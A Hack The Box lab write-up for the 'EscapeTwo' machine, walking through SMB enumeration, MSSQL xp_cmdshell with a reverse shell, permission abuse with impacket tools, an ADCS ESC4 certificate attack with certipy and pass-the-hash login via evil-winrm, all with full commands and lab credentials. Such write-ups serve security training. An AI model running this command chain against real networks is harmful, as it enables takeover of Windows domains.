---
title: "HTB: EscapeTwo"
date: 2025-05-28
excerpt: EscapeTwo is a Windows machine that involves exploiting MSSQL, abusing Active Directory permissions, and exploiting a certificate template vulnerability.
readingTime: 15
tags:
  - HTB
  - Writeup
  - Easy
  - Windows
  - MSSQL
  - xp_cmdshell
  - SMB
  - nxc
  - bloodhound
  - impacket
  - ADCS
  - Certificate Templates
  - evil-winrm
  - writeowner
  - certipy
author: pir4cy
coverImage: /images/htb/covers/escapetwo-cover.png
draft: false
---

# EscapeTwo

> **TL;DR:**
> 
> - Starting with the provided credentials for 'rose', we access SMB shares and discover files containing 'sa' MSSQL credentials.
> - Using the 'sa' credentials, we enable xp_cmdshell to obtain a reverse shell as sql_svc.
> - From sql_svc, we find credentials in a config file and discover ryan uses the same password.
> - As ryan, we find we have WriteOwner access to ca_svc and can leverage this to gain access to ca_svc.
> - ca_svc is part of the CERTPUBLISHERS group, allowing us to exploit the DunderMifflin Certificate Template.
> - Finally, using the template vulnerability, we obtain the Administrator hash and gain system access.
> 
![Attack Path](/images/htb/machines/EscapeTwo/attack-path.png)

> **Conclusion:**
> This box demonstrates a realistic attack chain involving credential discovery, Active Directory permission abuse, and certificate template exploitation. It showcases important security weaknesses in certificate templates that are often overlooked. 


## Info  
  * IP: 10.10.11.51
  * OS: Windows
  * Difficulty: Easy
  * Initial credentials: `rose:KxEPkKe6R8su`

## Initial Scan

Let's start with an nmap scan to identify available services:
![Nmap Scan](/images/htb/machines/EscapeTwo/nmap.png "NMAP")

Our scan reveals the following key services:
- SMB (445)
- MSSQL Server (1433)
- Other standard Windows services

Let's add the target to our hosts file:
```
10.10.11.51 dc01.sequel.htb sequel.htb
```

## Enumeration

Enumerating the SMB shares using the provided credentials:

```
nxc smb dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --shares
```

![SMB Shares](/images/htb/machines/EscapeTwo/rose-shares.png)

We find an "Accounting Department" share that's accessible. Let's see what's inside:

```
nxc smb dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --shares -M spider_plus -o DOWNLOAD_FLAG=True
```

In the share, we discover some Excel files. After unzipping and analyzing them, we find credentials for the 'sa' user for the MSSQL server.

## MSSQL Exploitation

With the 'sa' credentials in hand, we can now connect to the MSSQL server:

```
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@dc01.sequel.htb
```

Once connected, we aim to enable xp_cmdshell to execute commands - `enable_xp_cmdshell`

![sa cmdshell](/images/htb/machines/EscapeTwo/sa-mssql-login.png)

Now that we can execute commands on the target machine, let's set up a reverse shell:

```
xp_cmdshell powershell -e <base64 payload>
```
![sa revshell](/images/htb/machines/EscapeTwo/sa-revshell-powershell.png)

Successfully obtained a reverse shell as user 'sql_svc'!

![sql_svc shell](/images/htb/machines/EscapeTwo/sql-svc-shell.png)

## User Access

As 'sql_svc', we find a config file containing credentials:

![sql_svc creds](/images/htb/machines/EscapeTwo/sql-svc-creds-found.png)

The config file reveals credentials for the 'sql_svc' user. Testing these credentials against other accounts, we discover that 'ryan' uses the same password.

Let's run a quick check to confirm we can authenticate as 'ryan':

```
nxc smb dc01.sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

![ryan-same-password](/images/htb/machines/EscapeTwo/ryan-pwned-same-password.png)

Great! We can authenticate as 'ryan' and can grab the user.txt flag.

![ryan-pwned](/images/htb/machines/EscapeTwo/user-pwned.png)

## Privilege Escalation

Let's further enumerate our access as 'ryan' using BloodHound to understand our permissions in the Active Directory environment. Netexec does have a bloodhound collection mode that we can utilize.

```
nxc ldap dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --bloodhound --collection All -d sequel.htb --dns-server 10.10.11.51
```

After analyzing the BloodHound results, we discover that 'ryan' has WriteOwner access to the 'ca_svc' account. This is a significant privilege that we can exploit.

![ryan-writeowner](/images/htb/machines/EscapeTwo/ryan-permissions-write.png)

To abuse the WriteOwner access:

1. Use impacket-owneredit to take ownership of the 'ca_svc' account:
```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51   
```

2. Use impacket-dacledit to modify ACLs and grant full control:
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
```

3. Reset the password for ca_svc:
```
net rpc password "ca_svc" 'pir4cy1sc00l!' -U "sequel.htb"/"ryan"%'WqSZAF6CysDQbGb3' -S "dc01.sequel.htb"
```

![ryan-abusing-writeowner](/images/htb/machines/EscapeTwo/ryan-abusing-writeOwner.png)

Now we have access to the 'ca_svc' account!

## ADCS Exploitation

With access to 'ca_svc', we discover that this account is a member of the CERTPUBLISHERS group, which has special privileges related to Active Directory Certificate Services (ADCS).

Using certipy-ad, we can enumerate available certificate templates:

```
certipy-ad find -u ca_svc@sequel.htb -p 'pir4cy1sc00l!' -dc-ip 10.10.11.51 -text
```
![certipy find](/images/htb/machines/EscapeTwo/certipy-find-certificates.png)

We identify a vulnerable template called "DunderMifflinAuthentication" that has the ESC4 vulnerability, allowing the CERTPUBLISHERS group to request certificates for any user, including Administrator. The vulnerability exists because members of the CERTPUBLISHERS group have enrollment rights and dangerous permissions (Full Control, Write Owner, Write DACL) on the template.

![exploitable template](/images/htb/machines/EscapeTwo/certipy-dunder-mifflin-template.png)

Let's exploit this ESC4 vulnerability to obtain a certificate for the Administrator account:

```
certipy-ad req -username ca_svc@sequel.htb -p 'pir4cy1sc00l!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb 
```

![certipy admin req](/images/htb/machines/EscapeTwo/certipy-admin-forge.png)

With the certificate, we can retrieve the Administrator's NT hash:

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

![admin hash](/images/htb/machines/EscapeTwo/admin-hash.png)

Finally, we can use Evil-WinRM with the hash to get system access:

```
evil-winrm -i dc01.sequel.htb -u Administrator -H <admin hash>
```

Success! We can now grab the root.txt flag from the Administrator's desktop.

![rooted](/images/htb/machines/EscapeTwo/rooted.png)

## Conclusion

EscapeTwo demonstrates a realistic attack chain that combines multiple techniques:
1. Finding credentials through SMB file access
2. MSSQL exploitation using xp_cmdshell
3. Credential reuse detection
4. Active Directory permission abuse (WriteOwner)
5. Certificate template exploitation via CERTPUBLISHERS group membership

This box highlights the importance of proper configuration of certificate templates in Active Directory environments, which is often overlooked but can lead to complete domain compromise.

## References
- [impacket](https://github.com/fortra/impacket)
- [NetExec](https://www.netexec.wiki/)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Certipy](https://github.com/ly4k/Certipy)
- [ADCS Attack](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Abusing WriteOwner Permissions](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
